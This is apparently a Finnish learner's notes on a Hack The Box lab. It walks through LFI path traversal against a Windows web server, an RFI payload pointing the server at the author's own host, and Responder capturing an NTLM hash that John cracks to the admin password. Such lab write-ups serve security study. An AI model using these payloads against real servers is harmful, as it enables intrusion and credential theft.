...
Kun yritin yhdistää palvelimelle, tuli not responsive error, joten luin official writeuppia.
...
--06.10.2025 16:00 - 22:00---

Tehtävässä piti kokeilla LFI hyökkäystä. Tämä oli melko helppo ymmärtää, sillä htb tehtävänannossa oli jo muokattu urli annettu hyökkäykselle. 

Vastaus tohon kysymykseen oli: ../../../../../../../../windows/system32/drivers/etc/hosts

Seuraava RFI hyökkäys oli myös helppo ymmärtää, sillä vastaus oli jo tehtävänannossa. 

Vastaus oli: //10.10.14.6/somefile 

Seuraavaksi tulikin mielenkiintoinen vaihe, htb pyysi saamaan admin salasanan talteen.

Ennnen kun siirryn itse tehtävänantoon yritän ymmärtää mitä tällä haetaan ja miksi sen pitäisi toimia.

LFI ja RFI hyökkäyksen tarkoitus:

Tiedetään etukäteen, että kyseessä on Windows palvelin (nmap kertoi tämän tiedon meille), joten hyökkäyksen tyypi pitää muokkaa windows palvelimeen yhteensopivaksi.

Tämän tyyppisen urlin "../../../../../../../../windows/system32/drivers/etc/hosts" tarkoitus on, että palvelin paljastaisi jotain mitä sen ei kuuluisi. Toinen nimitys tälle on path traversal.

Syntaksissa huomaat, että siinä on paljon ../, tämä tarkoittaa, että mene yksi taso ylemmäs hakemistopuulle. 

Koska palvelin hakee tiedostoja tällaisessa muodossa page=index.html, palvelin käsittelee kaikki page=-parametrille tulevat komennot luotettaviksi. Jos page= paratmetriksi asetetaan muutama ../-merkki, palvelin automaattisesti luulee, että tämä on oikea toiminta, jonka sen pitää suorittaa. Palvelimella ei siis ole mitään käistystä, että tämä olisi jokun ulkopuolisen syöttämä komento vaan luule, että tämä on oikea user inputti. 

RFI hyökkäyksessä, uhrin weppipalvelin ottaa yhteyttä vakolijaan palvelimelle. Esim. "http://unika.htb/?page=//10.10.14.249/somefile" 

Tehtävää olisi voinut ratkea monella eri tavalla, itselleni tuli mieleen että joku reverse shelli lähettää uhrin palvelimelle page= parametrejä käyttäen.

Hyökkääjä hostaa oman palvelimen, minkä kautta hän syöttäisi esim. php tiedoston uhrille ja uhrin palvelin lataisi ao tiedoston.

Kuitenkin jäin ennen tämän kirjoittamista jumiin tehtävänannossa, joten päätin lukea official writeuppia, siellä neuvottiin käyttämään responderia. 

En lukenut sitä enempää vaan halusin kokeilla itse.

Responderiss pitää huomata se, että hyökkääjän pitää olla kiinni samassa verkkosegmentissä kuin kone jolle hyökkäystä kohdistetaan.

Hostasin responderin käyttäen sudo responder -I tun0 komennolla.

-I flagi spesifoi mitä network interfacea käytetään. tässä tapauksessa se on tun0 koska hyökkäys kohdistetaan htb palvelimen tietokoneelle.

Seuraavaksi, piti syöttää IP osoite tässä muodossa: http://unika.htb/?page=//10.10.14.249/somefile 10.10.14.249 on minun openvpn ip osoite.

Kun suoritin kyseisen haun, responderin terminaaliin ilmestyi seuraava hashi:

<img width="743" height="478" alt="image" src="https://github.com/user-attachments/assets/0069c5f0-cd82-4d17-a702-e91d9be25b5e" />

Kun tämän koko hashin dummppaa tekstitiedostoon ja sieltä johniin, saadaan salasanaksi badminton

<img width="728" height="254" alt="image" src="https://github.com/user-attachments/assets/e4538fc8-a638-4067-8673-8bcf2b9937cb" />
